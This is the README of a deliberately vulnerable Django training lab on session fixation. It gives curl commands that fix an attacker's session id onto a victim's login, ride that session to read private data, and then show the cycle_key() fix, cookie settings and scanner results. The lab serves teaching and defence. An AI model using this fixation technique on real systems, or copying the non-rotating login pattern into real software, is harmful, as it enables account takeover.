# Lab 12 — Session Hijacking & Fixation

Companion lab for the blog post
**[Session Hijacking and Fixation: Why Django Rotates Your Session Key on Login — and How a Hand-Rolled Auth Flow Undoes It](https://thiagoteixeira.tech/blog/session-hijacking-and-fixation-why-django-rotates-your-session-key-on-login-and-how-a-hand-rolled-auth-flow-undoes-it/)**.

| | |
|---|---|
| **OWASP** | A07:2021 — Identification & Authentication Failures |
| **CWE** | CWE-384 — Session Fixation · CWE-614 — Sensitive Cookie Without 'Secure' Flag (the cookie half) |
| **ASVS** | V3.2.1 — a new session token is generated on authentication |
| **Detection** | No SAST rule possible (the flaw is the *absence* of `cycle_key()` — nothing to match). Django's own **`manage.py check --deploy`** flags the cookie half (`security.W012`); the rotation half is proven by `tests.py` + the `curl` probe below |

> ⚠️ Intentionally vulnerable. Run locally / in the provided Docker stack only. See [SECURITY.md](../../SECURITY.md).

## The two views

| View | File | What it does |
|---|---|---|
| Vulnerable | [`views_vulnerable.py`](views_vulnerable.py) | authenticates by writing `_auth_user_id`/backend/hash to `request.session` **by hand** — reproducing `login()`'s session writes but **not** its `cycle_key()` rotation |
| Secure | [`views_secure.py`](views_secure.py) | the same flow through `django.contrib.auth.login()`, which calls `cycle_key()` — a fresh random session id on the privilege change |

Both authenticate the same user with the same password. The only difference is
whether the **session id is rotated** at login. The vulnerable view promotes
whatever id the browser arrived with straight to an authenticated session; the
secure view throws that id away and issues a new one.

The privilege boundary is a third endpoint, [`/session/secret/`](views_session.py),
which serves **bob's** private data (the flag) only to a session authenticated as
bob. **Reading it from a session id you fixed in advance *is* the fixation.**

## Run it

From the repository root (the folder with `docker-compose.yml`):

```bash
docker compose up -d          # Postgres + Django on http://127.0.0.1:8000 (background)
docker compose exec web python manage.py seed_labs
```

The seed creates the shared cast (`alice`, `bob`) and gives **bob** (the victim) a
private secret holding the flag. Everything below is `curl` against that stack —
no browser needed. On Windows PowerShell, `curl` is an alias for
`Invoke-WebRequest`; use `curl.exe`, or Git Bash.

## Exploit the pair from the command line

**1. Attacker grabs an anonymous session id** — the value they will fix onto the
victim:

```bash
curl -s -c atk.txt http://127.0.0.1:8000/session/whoami/
# session=<K> user=anonymous
K=$(grep sessionid atk.txt | awk '{print $7}')
```

**2. Fixation via the VULNERABLE login** — the victim (bob) logs in *carrying the
attacker's id* `K`. The hand-rolled view never rotates, so `K` is promoted in
place to bob's authenticated session:

```bash
curl -s -b "sessionid=$K" -d 'username=bob&password=labpass' \
     http://127.0.0.1:8000/session/vulnerable/login/
# logged in as bob (session NOT rotated)
```

**3. Ride the fixed session** — the attacker, reusing the *same* `K`, is now bob:

```bash
curl -s -b "sessionid=$K" http://127.0.0.1:8000/session/secret/
# <h1>Private secret</h1><p>bob: private: FLAG{session_fixation_rode_the_unrotated_session}</p>
```

**4. The fix** — repeat against the SECURE login. `auth.login()` calls
`cycle_key()`, so bob gets a *new* id and the attacker's fixed `K` stays anonymous:

```bash
curl -s -c atk2.txt http://127.0.0.1:8000/session/whoami/ >/dev/null
K2=$(grep sessionid atk2.txt | awk '{print $7}')
curl -s -b "sessionid=$K2" -d 'username=bob&password=labpass' \
     http://127.0.0.1:8000/session/secure/login/
# logged in as bob (session rotated)
curl -s -o /dev/null -w '%{http_code}\n' -b "sessionid=$K2" \
     http://127.0.0.1:8000/session/secret/
# 302  — the fixed id was never promoted; @login_required bounces it
```

Or prove all of it in one command (from the repo root):

```bash
docker compose run --rm web python manage.py test labs.post_12_session_fixation
```

> **Why this reproduces fixation.** In the real attack the victim's browser is
> *tricked* into adopting the attacker's id (a crafted link, an XSS write to
> `document.cookie`, a `Set-Cookie` on a shared subdomain). On the command line
> that trick is just `-b "sessionid=$K"` on the victim's login — the mechanism is
> identical: the id existed before login, and the vulnerable view authenticated
> it in place.

## The fix

Authenticate through `django.contrib.auth.login()` — never mark a session
authenticated by hand:

```python
from django.contrib.auth import authenticate, login

def login_view(request):
    user = authenticate(request, username=..., password=...)
    if user is not None:
        login(request, user)   # cycle_key(): new session id, data preserved
```

And in production, pin the cookie to HTTPS and bound its lifetime in `settings.py`:
`SESSION_COOKIE_SECURE = True`, `SESSION_COOKIE_HTTPONLY = True` (the default),
`SESSION_COOKIE_SAMESITE = 'Lax'` (the default), a sensible `SESSION_COOKIE_AGE` —
see the post.

## Isolation

This lab teaches session fixation and nothing else. The victim's password is a
normal shared-cast password (fixation does not crack it — the victim logs in
themselves; brute force is Post 11). Output is escaped (not an XSS lab, Post 2).
The secret lookup is scoped to `request.user`, so it does not drift into IDOR
(Post 6). Global CSRF is off in this project, so the login POST needs no token
(CSRF is Post 8).

## Scanning it

The standard SAST tools **miss this class**, and for a deeper reason than usual:
there is no dangerous *call* and — for the fixation half — no code at all, only a
missing `cycle_key()`. **Bandit** reports **0** on the views. **Semgrep's
community packs** report **0** (156 rules); the registry/audit tier surfaces only
**unrelated nits** (`direct-use-of-httpresponse` on the lab's plain `HttpResponse`
views, a maintainability nit) — nothing about session rotation. A rule cannot
flag an absent call, so — like Lab 11 — this lab ships **no custom rule** (§6.4.1).

What *does* catch the cookie half is **Django's own deployment scanner**:

```bash
docker compose run --rm web python manage.py check --deploy
# ?: (security.W012) SESSION_COOKIE_SECURE is not set to True. Using a secure-only
#    session cookie makes it more difficult for network traffic sniffers to hijack
#    user sessions.
```

`W012` names the exact Firesheep lesson. The rotation half has no scanner — its
proof is the deterministic `session_key`-changes-across-`login()` assertion in
`tests.py` and the `curl` fixation probe above. The captured runs are under
[`scans/`](scans/); `tests.py` is the runnable proof of the escalation.
